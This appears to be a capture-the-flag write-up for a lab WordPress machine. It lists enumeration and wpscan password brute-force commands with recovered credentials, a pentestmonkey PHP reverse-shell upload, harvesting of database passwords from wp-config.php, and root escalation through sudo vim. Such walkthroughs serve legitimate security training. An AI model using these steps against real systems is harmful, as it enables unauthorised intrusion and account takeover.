Step 1: NMAP

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
4512/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
---------------------------------------------------------------------------------------------------------
Step 2: HTTP
Using dirsearch to get more avaialable files in the site.

dirsearch -u http://10.0.0.36

We find a login page.

http://10.0.0.36/wp-login.php

Now let's try to find a username and password or atleast a username so we could brute force the login.
The wp-config.php file isn't avaiable. Because this is a Wordpress site we use the wpscan tool.

wpscan -v -e ap,vt,cb,u --url 10.0.0.36

The scan found a couple usernames - 

the cold is person
philip
c0ldd
hugo

We can try to brute force using wpscan.

wpscan --url http://10.0.0.36 --usernames 'the cold in person' 'philip' 'c0ldd' 'hugo' -P /usr/share/wordlists/rockyou.txt

Brute Force results:
c0ldd:9876543210

Let's try to log in with the found credtiantls. And we have access to the admin page. Now let's see if a reverse shell works.
Using a reverse shell script...

https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
---------------------------------------------------------------------------------------------------------
Step 3: PRIVIALGE ESCILATION
we gain a shell on our local machine. We are the www-date user, using "sudo -l" we don't have any permissions. Reading the /etc/passwd file there is another user named c0ldd, Going to the /home/c0ldd directory, there is a user.txt file but we don't have any permission to read it.
Because this machine hosts the Wordpress site, we can go to /var/www/html and read the wp-config.php file:

/** MySQL database username */
define('DB_USER', 'c0ldd'); -----> c0ldd

/** MySQL database password */
define('DB_PASSWORD', 'cybersecurity'); -----> cybersecurity

Logging to the c0ldd user we can now read the user.txt file in the home folder:

user.txt - 
RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==
Decode:
Congratulations, first level achieved!

Ssing "sudo -l" we can run the "vim" command and open a new shell as root.
As the root user we can now go to the root directory and read root.txt:

root.txt - 
wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=
Decode:
Congratulations, machine completed!